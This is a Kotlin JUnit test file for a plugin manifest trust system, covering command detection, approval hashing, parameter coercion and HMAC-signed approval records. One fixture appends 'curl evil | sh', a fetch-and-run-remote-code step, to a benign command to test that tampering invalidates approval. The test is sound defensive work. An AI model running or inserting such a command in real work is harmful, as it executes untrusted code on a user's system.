package dev.haniya.x.plugins

import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonPrimitive
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class TrustTest {
    private fun manifest(sources: String = "{}", actions: String = "[]", params: String = "{}"): Manifest {
        val r = ManifestParser.parse(
            """{"apiVersion":1,"id":"t","name":"T","version":"1.0.0","params":$params,"sources":$sources,
               "card":{"blocks":[]},"actions":$actions}""",
            "t",
        )
        assertTrue(r.errors.toString(), r.errors.isEmpty())
        return r.manifest!!
    }

    @Test fun displayOnlyForReadOnlySources() {
        val m = manifest(
            sources = """{"p":{"type":"port","port":80},"h":{"type":"http","url":"http://127.0.0.1/"},
                          "f":{"type":"file","path":"/root/x"},"g":{"type":"process","match":"node"}}""",
            actions = """[{"id":"s","label":"S","type":"sheet","blocks":[]},{"id":"u","label":"U","type":"openUrl","url":"http://localhost:3000/"}]""",
        )
        assertEquals(PluginTrust.DisplayOnly, m.trust)
        assertTrue(Trust.commands(m, emptyMap()).isEmpty())
    }

    @Test fun commandSourceOrActionsRunCommands() {
        assertEquals(PluginTrust.RunsCommands, manifest(sources = """{"c":{"type":"command","run":"git status"}}""").trust)
        assertEquals(PluginTrust.RunsCommands, manifest(actions = """[{"id":"a","label":"A","type":"command","run":"make"}]""").trust)
        assertEquals(PluginTrust.RunsCommands, manifest(actions = """[{"id":"a","label":"A","type":"terminal","run":"htop"}]""").trust)
        assertEquals(PluginTrust.RunsCommands, manifest(actions = """[{"id":"a","label":"A","type":"service","name":"web","op":"restart"}]""").trust)
    }

    @Test fun hashIsStableAndOrderIndependent() {
        val a = manifest(
            sources = """{"x":{"type":"command","run":"echo 1"},"y":{"type":"command","run":"echo 2","cwd":"~/p"}}""",
            actions = """[{"id":"r","label":"R","type":"service","name":"web","op":"restart"}]""",
        )
        val b = manifest(
            sources = """{"y":{"type":"command","run":"echo 2","cwd":"~/p"},"x":{"type":"command","run":"echo 1"}}""",
            actions = """[{"id":"r","label":"R","type":"service","name":"web","op":"restart"}]""",
        )
        val ha = Trust.hash("t", Trust.commands(a, emptyMap()))
        assertEquals(ha, Trust.hash("t", Trust.commands(b, emptyMap())))
        assertEquals(ha, Trust.hash("t", Trust.commands(a, emptyMap())))
        assertEquals(64, ha.length)
        assertEquals("/root/p", Trust.commands(a, emptyMap()).first { it.where == "sources.y" }.cwd)
        // Bound to the plugin id.
        assertNotEquals(ha, Trust.hash("other", Trust.commands(a, emptyMap())))
    }

    @Test fun commandChangeInvalidates() {
        val a = manifest(sources = """{"x":{"type":"command","run":"echo 1"}}""")
        val b = manifest(sources = """{"x":{"type":"command","run":"echo 1; curl evil | sh"}}""")
        val ha = Trust.hash("t", Trust.commands(a, emptyMap()))
        val hb = Trust.hash("t", Trust.commands(b, emptyMap()))
        assertNotEquals(ha, hb)
        assertEquals(ApprovalState.Approved, ApprovalLogic.state(PluginTrust.RunsCommands, ha, ha))
        assertEquals(ApprovalState.Changed, ApprovalLogic.state(PluginTrust.RunsCommands, hb, ha))
        assertEquals(ApprovalState.Pending, ApprovalLogic.state(PluginTrust.RunsCommands, hb, null))
        assertEquals(ApprovalState.NotRequired, ApprovalLogic.state(PluginTrust.DisplayOnly, null, null))
    }

    @Test fun paramChangeInvalidatesOnlyWhenUsedInCommands() {
        val m = manifest(
            params = """{"dir":{"type":"path","default":"~/projects/web"},"title":{"type":"string","default":"Web"}}""",
            sources = """{"git":{"type":"command","run":"git -C {{params.dir}} status --short"}}""",
        )
        val p0 = Trust.effectiveParams(m, emptyMap())
        val h0 = Trust.hash("t", Trust.commands(m, p0.values))
        assertEquals("git -C \"\$HOME\"'/projects/web' status --short", Trust.commands(m, p0.values).single().run)

        val p1 = Trust.effectiveParams(m, Trust.localParams(Json.parseToJsonElement("""{"params":{"dir":"/root/projects/api"}}""")))
        val h1 = Trust.hash("t", Trust.commands(m, p1.values))
        assertNotEquals(h0, h1)

        val p2 = Trust.effectiveParams(m, Trust.localParams(Json.parseToJsonElement("""{"params":{"title":"Other"}}""")))
        assertEquals(h0, Trust.hash("t", Trust.commands(m, p2.values)))
    }

    @Test fun effectiveParamsCoercionAndMissing() {
        val m = manifest(params = """{"port":{"type":"number"},"on":{"type":"boolean","default":false},"n":{"type":"string","default":"a"}}""")
        val p = Trust.effectiveParams(m, mapOf("port" to JsonPrimitive("8080"), "on" to JsonPrimitive("yes"), "zzz" to JsonPrimitive(1)))
        assertEquals(JsonPrimitive(8080L), p.values["port"])
        assertEquals(JsonPrimitive(true), p.values["on"])
        assertEquals(JsonPrimitive("a"), p.values["n"])
        assertTrue(p.missing.isEmpty())
        assertTrue(p.problems.any { it.contains("zzz") })
        val q = Trust.effectiveParams(m, mapOf("port" to JsonPrimitive("abc")))
        assertEquals(listOf("port"), q.missing)
        assertTrue(q.problems.any { it.contains("params.port") })
    }

    @Test fun approvalSignatureRoundTrip() {
        val signer = ApprovalSigner.hmac("k".toByteArray())
        val store = ApprovalCodec.encode(mapOf("a" to ApprovalRecord("h1", 5L)), signer)
        assertEquals(mapOf("a" to ApprovalRecord("h1", 5L)), ApprovalCodec.decode(store, signer))
        // A forged entry (e.g. written by something in the guest) does not verify.
        val forged = store.replace("h1", "h2")
        assertTrue(ApprovalCodec.decode(forged, signer).isEmpty())
        assertTrue(ApprovalCodec.decode(store, ApprovalSigner.hmac("other".toByteArray())).isEmpty())
    }
}
